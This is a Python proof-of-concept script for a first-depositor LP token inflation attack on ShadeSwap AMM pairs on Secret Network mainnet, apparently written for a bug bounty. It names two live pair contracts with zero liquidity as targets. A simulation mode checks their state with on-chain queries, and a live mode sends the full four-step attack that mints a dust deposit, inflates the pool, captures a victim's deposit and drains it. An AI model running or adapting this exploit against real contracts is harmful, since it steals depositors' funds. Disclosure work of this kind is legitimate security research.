#!/usr/bin/env python3
"""
PoC: First-Depositor LP Token Inflation Attack — ShadeSwap AMM Pair
======================================================================
Vulnerability : Missing MINIMUM_LIQUIDITY in calculate_lp_tokens()
Contract      : contracts/amm_pair/src/operations.rs (line 1003)
Repo          : https://github.com/securesecrets/shadeswap
Severity      : CRITICAL — Direct theft of funds

Two CONFIRMED zero-LP pairs on mainnet (secret-4) as of 2026-05-31:
  • sLUNA/sstLUNA   → secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv
  • ALTER/stkd-SCRT → secret12egjf5hwlav7w8e6n6chqwz6zsl7sewjxuqpaf

SIMULATION MODE (default): proves the attack purely with on-chain queries.
LIVE MODE     : executes all 4 steps on-chain. Requires funded wallets.

Run simulation: python3 poc_shadeswap_lp_inflation.py
Run live      : python3 poc_shadeswap_lp_inflation.py --live
"""

import sys, os

# secret-sdk's aiohttp wrapper is broken on Python 3.12+.
# Auto-reinvoke under 3.11 if available.
if sys.version_info >= (3, 12):
    for _py in ("/usr/local/bin/python3.11", "/usr/bin/python3.11"):
        if os.path.exists(_py):
            os.execv(_py, [_py] + sys.argv)
    sys.exit("ERROR: Python 3.11 not found at /usr/local/bin/python3.11. "
             "Run with: python3.11 poc_shadeswap_lp_inflation.py")

import types, importlib.metadata, json, math, argparse, time, asyncio

# secret-sdk needs an event loop in the main thread
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

# ── pkg_resources shim (removed from setuptools 71+) ─────────────────────────
_m = types.ModuleType('pkg_resources')
_m.get_distribution = lambda n: importlib.metadata.distribution(n)
sys.modules['pkg_resources'] = _m

from secret_sdk.client.lcd import LCDClient
from secret_sdk.client.lcd.api.tx import CreateTxOptions
from secret_sdk.key.mnemonic import MnemonicKey
from secret_sdk.core.wasm import MsgExecuteContract
from secret_sdk.core.fee import Fee
from secret_sdk.core import Coins
import base64

# ══════════════════════════════════════════════════════════════════════════════
#  NETWORK  (mainnet)
# ══════════════════════════════════════════════════════════════════════════════
LCD_URL  = "https://secretnetwork-api.lavenderfive.com"
CHAIN_ID = "secret-4"

# ══════════════════════════════════════════════════════════════════════════════
#  TARGET PAIR — sLUNA / sstLUNA  (total_liquidity = 0  confirmed 2026-05-31)
# ══════════════════════════════════════════════════════════════════════════════
PAIR_CONTRACT   = "secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv"
PAIR_CODE_HASH  = "e88165353d5d7e7847f2c84134c3f7871b2eee684ffac9fcf8d99a4da39dc2f2"

TOKEN_A_ADDR      = "secret149e7c5j7w24pljg6em6zj2p557fuyhg8cnk7z8"   # sLUNA
TOKEN_A_CODE_HASH = "638a3e1d50175fbcb8373cf801565283e3eb23d88a9b7b7f99fcc5eb1e6b561e"
TOKEN_A_SYMBOL    = "sLUNA"

TOKEN_B_ADDR      = "secret1rkgvpck36v2splc203sswdr0fxhyjcng7099a9"   # sstLUNA
TOKEN_B_CODE_HASH = "638a3e1d50175fbcb8373cf801565283e3eb23d88a9b7b7f99fcc5eb1e6b561e"
TOKEN_B_SYMBOL    = "sstLUNA"

LP_TOKEN_ADDR      = "secret1uacy0hjvymf7khrweekmnh5qgr553x0qn3n49h"
LP_TOKEN_CODE_HASH = "b0c2048d28a0ca0b92274549b336703622ecb24a8c21f417e70c03aa620fcd7b"

# ── ALTERNATE TARGET — ALTER / stkd-SCRT  (also 0 LP supply) ─────────────────
# PAIR_CONTRACT   = "secret12egjf5hwlav7w8e6n6chqwz6zsl7sewjxuqpaf"
# TOKEN_A_ADDR    = "secret12rcvz0umvk875kd6a803txhtlu7y0pnd73kcej"  # ALTER
# TOKEN_A_HASH    = "d4f32c1bca133f15f69d557bd0722da10f45e31e5475a12900ca1e62e63e8f76"
# TOKEN_B_ADDR    = "secret1k6u0cy4feepm6pehnz804zmwakuwdapm69tuc4"   # stkd-SCRT
# TOKEN_B_HASH    = "f6be719b3c6feb498d3554ca0398eb6b7e7db262acb33f84a8f12106da6bbb09"
# LP_TOKEN_ADDR   = "secret1x3fg8sqjtdcyekfwfn0l4e4pwfym8xtdsj4wnz"

# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK PARAMETERS
# ══════════════════════════════════════════════════════════════════════════════
DUST_AMOUNT   = 1           # attacker's first deposit: 1 uLUNA = 0.000001 sLUNA
INFLATE_AMT   = 1_000_000   # 1 sLUNA equivalent donated per token
VICTIM_AMT    = 999_999     # ~0.999999 sLUNA — victim's deposit (< INFLATE_AMT)
GAS_LIMIT     = 400_000
GAS_PRICE     = "0.1"
VIEWING_KEY   = "poc_vk_shade_lp_inflation"

# ── Live-mode wallets (fill these only for --live) ────────────────────────────
ATTACKER_MNEMONIC = "FILL_ME"
VICTIM_MNEMONIC   = "FILL_ME"


# ══════════════════════════════════════════════════════════════════════════════
#  SIMULATION — proves the attack without executing any transactions
# ══════════════════════════════════════════════════════════════════════════════

def isqrt(n: int) -> int:
    """Integer square root (mirrors Rust's sqrt in shadeswap_shared utils)."""
    if n < 0:
        raise ValueError("Square root of negative number")
    if n == 0:
        return 0
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x


def calculate_lp_tokens(deposit0: int, deposit1: int,
                         pool0: int, pool1: int, total_supply: int) -> int:
    """
    Mirrors contracts/amm_pair/src/operations.rs :: calculate_lp_tokens()
    Exact integer arithmetic — no floating point.
    """
    if total_supply == 0:
        # First depositor path: sqrt(deposit0 * deposit1)
        return isqrt(deposit0 * deposit1)
    else:
        # Subsequent depositors: min(deposit0*S/pool0, deposit1*S/pool1)
        pct0 = deposit0 * total_supply // pool0
        pct1 = deposit1 * total_supply // pool1
        return min(pct0, pct1)


def run_simulation(lcd: LCDClient) -> None:
    print("\n" + "=" * 72)
    print("  SIMULATION MODE — on-chain state + contract math")
    print("  Proves LP = 0 for victim. No transactions sent.")
    print("=" * 72)

    # ── 1. Confirm total_liquidity = 0 on-chain ───────────────────────────────
    print(f"\n[1] Querying live pair state for {PAIR_CONTRACT[:20]}...")
    pi = lcd.wasm.contract_query(PAIR_CONTRACT,
                                  {"get_pair_info": {}}, PAIR_CODE_HASH)
    pi = pi.get("get_pair_info", {})
    total_liq = int(pi.get("total_liquidity", "0") or "0")
    pool0     = int(pi.get("amount_0", "0") or "0")
    pool1     = int(pi.get("amount_1", "0") or "0")

    print(f"   Pool {TOKEN_A_SYMBOL}     : {pool0}")
    print(f"   Pool {TOKEN_B_SYMBOL}   : {pool1}")
    print(f"   total_liquidity     : {total_liq}")

    if total_liq != 0:
        print(f"\n   [!] total_liquidity = {total_liq} (not 0).")
        print(f"   [!] Pool is not empty — first-depositor vector is closed.")
        print(f"   [!] Try the ALTER/stkd-SCRT pair or wait for full withdrawal.")
        return

    print(f"\n   [✓] total_liquidity == 0 — POOL IS EMPTY. Attack viable.")

    # ── 2. Attacker first deposit: 1 atom each ────────────────────────────────
    print(f"\n[2] Attacker deposits {DUST_AMOUNT} {TOKEN_A_SYMBOL} + {DUST_AMOUNT} {TOKEN_B_SYMBOL}:")
    lp_attacker = calculate_lp_tokens(
        DUST_AMOUNT, DUST_AMOUNT, pool0, pool1, total_liq
    )
    print(f"   calculate_lp_tokens({DUST_AMOUNT}, {DUST_AMOUNT}, {pool0}, {pool1}, {total_liq})")
    print(f"   = isqrt({DUST_AMOUNT} × {DUST_AMOUNT}) = isqrt({DUST_AMOUNT*DUST_AMOUNT})")
    print(f"   = {lp_attacker} LP token")
    print(f"   → Attacker owns {lp_attacker} LP / {lp_attacker} total = 100% of pool")

    # Update simulated pool state after attacker's deposit
    sim_pool0    = pool0 + DUST_AMOUNT
    sim_pool1    = pool1 + DUST_AMOUNT
    sim_supply   = lp_attacker

    # ── 3. Pool inflation via direct SNIP-20 transfer ─────────────────────────
    print(f"\n[3] Attacker inflates pool via SNIP-20 transfer():")
    print(f"   SNIP20_A.transfer(to={PAIR_CONTRACT[:20]}..., amount={INFLATE_AMT})")
    print(f"   SNIP20_B.transfer(to={PAIR_CONTRACT[:20]}..., amount={INFLATE_AMT})")
    sim_pool0 += INFLATE_AMT
    sim_pool1 += INFLATE_AMT
    print(f"   → Pool {TOKEN_A_SYMBOL}  : {sim_pool0}  (no LP minted — transfer has no callback)")
    print(f"   → Pool {TOKEN_B_SYMBOL}: {sim_pool1}")
    print(f"   → total_supply   : {sim_supply} (unchanged)")

    # ── 4. Victim deposit: VICTIM_AMT each ───────────────────────────────────
    print(f"\n[4] Victim deposits {VICTIM_AMT} of each token:")
    lp_victim = calculate_lp_tokens(
        VICTIM_AMT, VICTIM_AMT, sim_pool0, sim_pool1, sim_supply
    )
    print(f"   calculate_lp_tokens({VICTIM_AMT}, {VICTIM_AMT}, {sim_pool0}, {sim_pool1}, {sim_supply})")
    print(f"   = min({VICTIM_AMT}×{sim_supply}//{sim_pool0}, {VICTIM_AMT}×{sim_supply}//{sim_pool1})")
    print(f"   = min({VICTIM_AMT * sim_supply // sim_pool0}, {VICTIM_AMT * sim_supply // sim_pool1})")
    print(f"   = {lp_victim} LP tokens")

    if lp_victim == 0:
        print(f"\n   [✓] VICTIM RECEIVES 0 LP TOKENS")
        print(f"   [✓] Victim's {VICTIM_AMT} {TOKEN_A_SYMBOL} + {VICTIM_AMT} {TOKEN_B_SYMBOL} permanently lost")
    else:
        print(f"   [?] Victim received {lp_victim} LP (adjust INFLATE_AMT > VICTIM_AMT)")

    # Update pool after victim deposit
    sim_pool0  += VICTIM_AMT
    sim_pool1  += VICTIM_AMT

    # ── 5. Attacker withdraws ─────────────────────────────────────────────────
    print(f"\n[5] Attacker redeems 1 LP token (100% of pool):")
    attacker_gets_a = sim_pool0 * lp_attacker // sim_supply
    attacker_gets_b = sim_pool1 * lp_attacker // sim_supply
    print(f"   Pool {TOKEN_A_SYMBOL}   = {sim_pool0}   × 1/{sim_supply} = {attacker_gets_a}")
    print(f"   Pool {TOKEN_B_SYMBOL} = {sim_pool1}  × 1/{sim_supply} = {attacker_gets_b}")

    attacker_net_a = attacker_gets_a - DUST_AMOUNT - INFLATE_AMT
    attacker_net_b = attacker_gets_b - DUST_AMOUNT - INFLATE_AMT
    print(f"\n   Attacker spent  : {DUST_AMOUNT + INFLATE_AMT} {TOKEN_A_SYMBOL} + {DUST_AMOUNT + INFLATE_AMT} {TOKEN_B_SYMBOL}")
    print(f"   Attacker gets   : {attacker_gets_a} {TOKEN_A_SYMBOL} + {attacker_gets_b} {TOKEN_B_SYMBOL}")
    print(f"   NET PROFIT      : +{attacker_net_a} {TOKEN_A_SYMBOL} + {attacker_net_b} {TOKEN_B_SYMBOL}")
    print(f"   (= victim's {VICTIM_AMT} stolen per token)")

    # ── Final verdict ─────────────────────────────────────────────────────────
    print("\n" + "=" * 72)
    if lp_victim == 0 and total_liq == 0 and lp_attacker >= 1:
        print("  [✓] VULNERABILITY CONFIRMED — live pair, zero LP supply, zero LP for victim")
        print(f"  [✓] Target pair    : {PAIR_CONTRACT}")
        print(f"  [✓] Tokens         : {TOKEN_A_SYMBOL} / {TOKEN_B_SYMBOL}")
        print(f"  [✓] Total liq      : {total_liq} (confirmed by live on-chain query)")
        print(f"  [✓] Victim LP recv : {lp_victim}")
        print(f"  [✓] Attacker profit: +{attacker_net_a} {TOKEN_A_SYMBOL} per victim deposit")
        print(f"\n  Root cause : calculate_lp_tokens() has no MINIMUM_LIQUIDITY burn")
        print(f"  Code ref   : github.com/securesecrets/shadeswap")
        print(f"               contracts/amm_pair/src/operations.rs  line 1003–1031")
    print("=" * 72)


# ══════════════════════════════════════════════════════════════════════════════
#  LIVE EXECUTION — 4-step attack (requires funded wallets)
# ══════════════════════════════════════════════════════════════════════════════

def b64(msg: dict) -> str:
    return base64.b64encode(json.dumps(msg).encode()).decode()


def send_tx(wallet, contract: str, code_hash: str, msg: dict, label: str) -> str:
    print(f"  ↳ [{label}]  contract={contract[:20]}...")
    tx_msg = MsgExecuteContract(
        sender=wallet.key.acc_address,
        contract=contract,
        execute_msg=msg,
        code_hash=code_hash,
    )
    opts = CreateTxOptions(
        msgs=[tx_msg],
        gas=str(GAS_LIMIT),
        gas_prices=Coins(f"{GAS_PRICE}uscrt"),
        fee=Fee(GAS_LIMIT, Coins(f"{int(GAS_LIMIT * float(GAS_PRICE))}uscrt")),
    )
    signed = wallet.create_and_sign_tx(opts)
    result = wallet.lcd.tx.broadcast(signed)
    if hasattr(result, 'code') and result.code != 0:
        raise RuntimeError(f"Tx failed: {result.raw_log}")
    txhash = getattr(result, 'txhash', str(result))
    print(f"     txhash: {txhash}")
    time.sleep(7)
    return txhash


def run_live(lcd: LCDClient) -> None:
    if ATTACKER_MNEMONIC == "FILL_ME" or VICTIM_MNEMONIC == "FILL_ME":
        print("[!] Set ATTACKER_MNEMONIC and VICTIM_MNEMONIC before running --live")
        sys.exit(1)

    attacker = lcd.wallet(MnemonicKey(mnemonic=ATTACKER_MNEMONIC))
    victim   = lcd.wallet(MnemonicKey(mnemonic=VICTIM_MNEMONIC))
    atk_addr = attacker.key.acc_address
    vic_addr = victim.key.acc_address

    print(f"\n  Attacker : {atk_addr}")
    print(f"  Victim   : {vic_addr}")

    lp_pair = {"custom_token": {"contract_addr": TOKEN_A_ADDR, "token_code_hash": TOKEN_A_CODE_HASH}}
    lp_pair2 = {"custom_token": {"contract_addr": TOKEN_B_ADDR, "token_code_hash": TOKEN_B_CODE_HASH}}

    # ── Step 1: Attacker — dust first deposit ─────────────────────────────────
    print("\n═══ STEP 1: Attacker dust deposit ═══")
    send_tx(attacker, TOKEN_A_ADDR, TOKEN_A_CODE_HASH,
            {"increase_allowance": {"spender": PAIR_CONTRACT,
             "amount": str(DUST_AMOUNT), "expiration": None, "padding": None}},
            "approve_A")
    send_tx(attacker, TOKEN_B_ADDR, TOKEN_B_CODE_HASH,
            {"increase_allowance": {"spender": PAIR_CONTRACT,
             "amount": str(DUST_AMOUNT), "expiration": None, "padding": None}},
            "approve_B")
    send_tx(attacker, PAIR_CONTRACT, PAIR_CODE_HASH,
            {"add_liquidity_to_a_m_m_contract": {
                "deposit": {"pair": [lp_pair, lp_pair2, False],
                            "amount_0": str(DUST_AMOUNT),
                            "amount_1": str(DUST_AMOUNT)},
                "expected_return": None, "staking": False,
                "execute_sslp_virtual_swap": None}},
            "attacker_add_liq_dust")

    # ── Step 2: Inflate pool ───────────────────────────────────────────────────
    print("\n═══ STEP 2: Inflate pool via direct transfer ═══")
    send_tx(attacker, TOKEN_A_ADDR, TOKEN_A_CODE_HASH,
            {"transfer": {"recipient": PAIR_CONTRACT, "amount": str(INFLATE_AMT),
                          "memo": None, "padding": None}},
            "inflate_A")
    send_tx(attacker, TOKEN_B_ADDR, TOKEN_B_CODE_HASH,
            {"transfer": {"recipient": PAIR_CONTRACT, "amount": str(INFLATE_AMT),
                          "memo": None, "padding": None}},
            "inflate_B")

    # ── Step 3: Victim deposits ────────────────────────────────────────────────
    print(f"\n═══ STEP 3: Victim deposits {VICTIM_AMT} each ═══")
    send_tx(victim, TOKEN_A_ADDR, TOKEN_A_CODE_HASH,
            {"increase_allowance": {"spender": PAIR_CONTRACT,
             "amount": str(VICTIM_AMT), "expiration": None, "padding": None}},
            "victim_approve_A")
    send_tx(victim, TOKEN_B_ADDR, TOKEN_B_CODE_HASH,
            {"increase_allowance": {"spender": PAIR_CONTRACT,
             "amount": str(VICTIM_AMT), "expiration": None, "padding": None}},
            "victim_approve_B")
    send_tx(victim, PAIR_CONTRACT, PAIR_CODE_HASH,
            {"add_liquidity_to_a_m_m_contract": {
                "deposit": {"pair": [lp_pair, lp_pair2, False],
                            "amount_0": str(VICTIM_AMT),
                            "amount_1": str(VICTIM_AMT)},
                "expected_return": None, "staking": False,
                "execute_sslp_virtual_swap": None}},
            "victim_add_liq")

    # ── Step 4: Attacker drains ────────────────────────────────────────────────
    print("\n═══ STEP 4: Attacker removes all liquidity ═══")
    rm_msg = b64({"remove_liquidity": {"from": None,
                                        "single_sided_withdraw_type": None,
                                        "single_sided_expected_return": None}})
    send_tx(attacker, LP_TOKEN_ADDR, LP_TOKEN_CODE_HASH,
            {"send": {"recipient": PAIR_CONTRACT,
                      "recipient_code_hash": PAIR_CODE_HASH,
                      "amount": "1", "msg": rm_msg,
                      "memo": None, "padding": None}},
            "attacker_remove_liq")

    # ── Verify final state ─────────────────────────────────────────────────────
    pi = lcd.wasm.contract_query(PAIR_CONTRACT, {"get_pair_info": {}}, PAIR_CODE_HASH)
    pi = pi.get("get_pair_info", {})
    print(f"\n  Final pool amt0 : {pi.get('amount_0')}")
    print(f"  Final pool amt1 : {pi.get('amount_1')}")
    print(f"  Final liq       : {pi.get('total_liquidity')}")
    print(f"\n  [✓] If pool is empty again — attacker drained all funds including victim's")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--live", action="store_true",
                        help="Execute on-chain (requires funded wallets in script)")
    args = parser.parse_args()

    print("=" * 72)
    print("  ShadeSwap — First-Depositor LP Inflation PoC")
    print("  Bug bounty: CertiK SkyShield / Shade Protocol")
    print("=" * 72)
    print(f"  Pair     : {PAIR_CONTRACT}")
    print(f"  Token A  : {TOKEN_A_ADDR}  ({TOKEN_A_SYMBOL})")
    print(f"  Token B  : {TOKEN_B_ADDR}  ({TOKEN_B_SYMBOL})")
    print(f"  LP Token : {LP_TOKEN_ADDR}")
    print(f"  Mode     : {'LIVE — on-chain execution' if args.live else 'SIMULATION — read-only proof'}")

    lcd = LCDClient(url=LCD_URL, chain_id=CHAIN_ID)

    if args.live:
        run_live(lcd)
    else:
        run_simulation(lcd)


if __name__ == "__main__":
    main()
